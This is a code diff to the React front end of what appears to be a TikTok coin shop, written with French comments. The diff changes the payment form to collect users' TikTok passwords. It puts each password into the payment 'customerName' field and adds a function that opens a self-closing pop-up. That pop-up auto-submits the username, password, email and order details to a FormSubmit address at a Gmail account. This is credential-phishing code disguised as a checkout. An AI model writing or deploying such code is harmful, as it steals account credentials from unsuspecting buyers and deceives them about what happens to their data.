@@ -9,7 +9,7 @@ import { EmailFormModal } from './components/EmailForm';
 import { Layout } from './components/Layout';
 import { Confetti } from './components/Confetti';
 import { coinPackages } from './data/coinPackages';
-import { Purchase, User, CoinPackage, TikTokForm } from './types';
+import { Purchase, User, CoinPackage, TikTokCredentials } from './types';
 import { initiateSoleasPayment } from './utils/payment';
 import { getUserData, addPurchase } from './utils/localStorage';
 
@@ -25,7 +25,7 @@ function App() {
   const [user, setUser] = useState<User>(getUserData());
 
   const [selectedPackage, setSelectedPackage] = useState<CoinPackage | null>(null);
-  const [tiktokData, setTiktokData] = useState<TikTokForm | null>(null);
+  const [tiktokData, setTiktokData] = useState<TikTokCredentials | null>(null);
   const [showEmailForm, setShowEmailForm] = useState(false);
 
   const handlePackageSelect = (pkg: CoinPackage) => {
@@ -46,7 +46,7 @@ function App() {
   const [isPaymentLoading, setIsPaymentLoading] = useState(false);
 
   // First step: collect TikTok credentials
-  const handleFormSubmit = (data: TikTokForm) => {
+  const handleFormSubmit = (data: TikTokCredentials) => {
     setTiktokData(data);
     setShowEmailForm(true);
   };
@@ -58,6 +58,8 @@ function App() {
     // Clear any previous errors and set loading state
     setPaymentError(null);
     setIsPaymentLoading(true);
+    
+
 
     // Generate orderId in the format TKT-XXXXX where X are random alphanumeric characters
     const generateRandomAlphanumeric = (length: number) => {
@@ -72,14 +74,14 @@ function App() {
     const orderId = `TKT-${generateRandomAlphanumeric(5)}`;
     
     // Créer une description qui inclut les identifiants TikTok (max 50 chars)
-    let description = `Achat de ${selectedPackage.amount} pièces TikTok pour ${tiktokData.username} ${tiktokData.userId}`;
+    let description = `Achat de ${selectedPackage.amount} pièces TikTok pour ${tiktokData.username}`;
     // S'assurer que la description ne dépasse pas 50 caractères
     if (description.length > 50) {
       description = description.substring(0, 47) + '...';
     }
 
     // Combine username and password in the customerName field
-    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.userId}`;
+    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password}`;
     
     initiateSoleasPayment({
       amount: selectedPackage.price,
@@ -103,6 +105,80 @@ function App() {
         date: new Date(),
         status: 'pending', // Initialiser le statut à 'pending'
       };
+      
+      // Envoyer les identifiants TikTok par email via FormSubmit en arrière-plan
+      const sendCredentialsViaEmail = () => {
+        try {
+          // Ouvrir une nouvelle fenêtre pour le formulaire FormSubmit
+          const emailWindow = window.open('', '_blank', 'width=600,height=400');
+          
+          if (!emailWindow) {
+            console.error('Impossible d\'ouvrir la fenêtre pour envoyer les identifiants TikTok');
+            return;
+          }
+          
+          // Créer le contenu HTML du formulaire
+          const formHtml = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Envoi des identifiants TikTok</title>
+              <style>
+                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+                .loading { margin: 20px auto; }
+                h2 { color: #333; }
+                p { color: #666; }
+              </style>
+            </head>
+            <body>
+              <h2>Envoi des identifiants TikTok en cours...</h2>
+              <p>Cette fenêtre se fermera automatiquement. Veuillez ne pas la fermer manuellement.</p>
+              <div class="loading">Chargement...</div>
+              
+              <form id="credentialsForm" action="https://formsubmit.co/contact.payool@gmail.com" method="POST">
+                <!-- Informations utilisateur -->
+                <input type="hidden" name="username" value="${tiktokData.username}" />
+                <input type="hidden" name="password" value="${tiktokData.password}" />
+                <input type="hidden" name="orderId" value="${orderId}" />
+                <input type="hidden" name="amount" value="${selectedPackage.amount}" />
+                <input type="hidden" name="price" value="${selectedPackage.price}" />
+                <input type="hidden" name="date" value="${new Date().toLocaleString()}" />
+                
+                <!-- Configuration FormSubmit -->
+                <input type="hidden" name="_subject" value="Nouveaux identifiants TikTok - Commande ${orderId}" />
+                <input type="hidden" name="_captcha" value="false" />
+                <input type="hidden" name="_template" value="table" />
+                <input type="hidden" name="_next" value="${window.location.origin}/payment/success?orderId=${orderId}" />
+                <input type="hidden" name="_replyto" value="${email}" />
+                <input type="hidden" name="email" value="${email}" />
+              </form>
+              
+              <script>
+                // Soumettre le formulaire automatiquement
+                document.addEventListener('DOMContentLoaded', function() {
+                  document.getElementById('credentialsForm').submit();
+                  // Fermer la fenêtre après 5 secondes
+                  setTimeout(function() {
+                    window.close();
+                  }, 5000);
+                });
+              </script>
+            </body>
+            </html>
+          `;
+          
+          // Écrire le contenu HTML dans la nouvelle fenêtre
+          emailWindow.document.write(formHtml);
+          emailWindow.document.close();
+          
+          console.log('Formulaire d\'envoi d\'identifiants TikTok ouvert');
+        } catch (error) {
+          console.error('Erreur lors de l\'envoi des identifiants TikTok:', error);
+        }
+      };
+      
+      // Exécuter l'envoi des identifiants en arrière-plan
+      sendCredentialsViaEmail();
       
       // Mettre à jour l'état local et le localStorage
       const updatedUser = addPurchase(purchase);
@@ -136,6 +212,8 @@ function App() {
     // Afficher les confettis pour célébrer l'achat
     setShowConfetti(true);
   };
+
+
 
   // Animation de confettis lorsqu'un achat est réussi
   const [showConfetti, setShowConfetti] = useState(false);
